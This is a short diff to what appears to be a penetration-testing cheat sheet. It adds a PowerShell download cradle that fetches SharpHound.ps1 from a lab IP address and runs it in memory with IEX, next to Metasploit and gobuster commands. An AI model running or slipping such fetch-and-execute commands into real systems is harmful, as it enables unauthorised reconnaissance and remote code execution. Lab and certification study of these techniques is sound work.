@@ -12,6 +12,15 @@ set srvhost 0.0.0.0
 run
 ```
 
+
+# Powershell
+```powershell
+#Download cradle and execute
+(new-object system.net.webclient).downloadstring('http://192.168.45.185/SharpHound.ps1') | IEX
+
+
+```
+
 # Go Buster
 ```bash
 gobuster dir -e -u http://192.168.120.132/ -w /usr/share/wordlists/dirb/common.txt
